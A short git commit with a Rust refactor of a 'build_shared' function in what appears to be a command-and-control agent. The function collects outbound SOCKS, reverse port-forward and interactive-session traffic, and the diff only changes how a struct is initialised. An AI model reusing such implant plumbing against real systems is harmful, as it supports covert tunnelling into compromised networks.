2d467aa1bc7d14f098e3452853d3fa402b997a15
zumpyx <zumpyx@outlook.com>
2026-06-07 14:25:02 +0800

    clean stream pump initialization

--- Payload_Type/nanaz/nanaz/agent_code/src/protocol_pump.rs
+++ Payload_Type/nanaz/nanaz/agent_code/src/protocol_pump.rs
@@ -73,10 +73,12 @@ impl ProtocolPump {
     }
 
     pub fn build_shared(&mut self) -> AgentExtras {
-        let mut shared = AgentExtras::default();
-        shared.socks = StreamDriver::drain_outbound(&mut self.socks);
-        shared.rpfwd = StreamDriver::drain_outbound(&mut self.rpfwd);
-        shared.interactive = StreamDriver::drain_outbound(&mut self.interactive);
+        let mut shared = AgentExtras {
+            socks: StreamDriver::drain_outbound(&mut self.socks),
+            rpfwd: StreamDriver::drain_outbound(&mut self.rpfwd),
+            interactive: StreamDriver::drain_outbound(&mut self.interactive),
+            ..Default::default()
+        };
         self.pending.extend(self.interactive.drain_responses());
         self.auxiliary.drain_into(&mut shared);
         shared
